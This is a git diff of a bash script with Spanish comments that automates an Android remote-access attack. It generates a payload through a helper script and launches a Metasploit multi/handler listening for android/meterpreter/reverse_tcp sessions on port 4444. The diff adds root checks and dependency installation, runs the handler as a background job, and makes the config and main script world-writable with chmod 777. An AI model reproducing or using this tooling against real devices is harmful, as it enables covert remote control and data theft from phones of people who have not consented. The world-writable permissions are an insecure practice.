@@ -1,5 +1,18 @@
 #!/bin/bash
 
+# Verificar si el script se está ejecutando como root
+if [[ $EUID -ne 0 ]]; then
+    echo -e "\e[31mError: Este script debe ejecutarse como root.\e[0m"
+    exit 1
+fi
+
+# Verificar si psmic está instalado
+if ! command -v fuser &>/dev/null; then
+    print_red -e "\e[31mEl comando fuser no está instalado.\e[0m"
+    echo "Instalando dependencia psmic..."
+    apt install psmisc -y 2>/dev/null
+fi
+
 source ./utilities/utils.sh
 
 # Función para mostrar el uso del script
@@ -18,7 +31,6 @@ while [[ "$#" -gt 0 ]]; do
         -i|--ip) LOCAL_IP="$2"; shift ;;
         -p|--port) PORT="$2"; shift ;;
         -h|--help) usage ;;
-        *) usage ;;
     esac
     shift
 done
@@ -31,19 +43,21 @@ if [[ -z "$LOCAL_IP" ]]; then
         echo -e "\e[31mError: No se pudo obtener la IP local automáticamente. Proporciónala con -i <IP_ADDRESS>\e[0m"
         exit 1
     else
-        echo "Usando la IP detectada automáticamente: $LOCAL_IP"
-        bash ./utilities/payload.sh -ip $LOCAL_IP
+        print_cyan "Usando la IP detectada automáticamente: $LOCAL_IP"
+        bash ./utilities/payload.sh -i $LOCAL_IP
     fi
 else
     # La IP se proporcionó por argumento
     echo "Usando la IP proporcionada: $LOCAL_IP"
-    bash ./utilities/payload.sh -ip $LOCAL_IP
+    bash ./utilities/payload.sh -i $LOCAL_IP
 fi
 
 # Si no se proporcionó un puerto, usar un valor predeterminado
 if [[ -z "$PORT" ]]; then
+    # Verificamos si tenemos fuser instalado
+  
     # Eliminamos los procesos que estén utilizando el puerto 4444
-    sudo fuser -k 4444/tcp &>/dev/null
+    fuser -k 4444/tcp &>/dev/null
     PORT=4444
 fi
 
@@ -59,12 +73,13 @@ use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 set LHOST $LOCAL_IP
 set LPORT $PORT
-exploit
+exploit -j
 EOL
 
 # Cambiar los permisos del archivo config.rc
-sudo chown root:root config.rc 2>/dev/null
-sudo chmod 777 config.rc 2>/dev/null
+chown root:root config.rc 2>/dev/null
+chmod 777 config.rc 2>/dev/null
+chown root:root main.sh 2>/dev/null
+chmod 777 main.sh 2>/dev/null
 
-# Ejecutar Metasploit con el archivo config.rc
-sudo msfconsole -r config.rc
+msfconsole -q -r config.rc 2>/dev/null
